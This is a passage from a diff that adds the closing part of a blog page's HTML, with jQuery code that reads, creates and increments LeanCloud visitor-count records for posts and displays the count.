+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
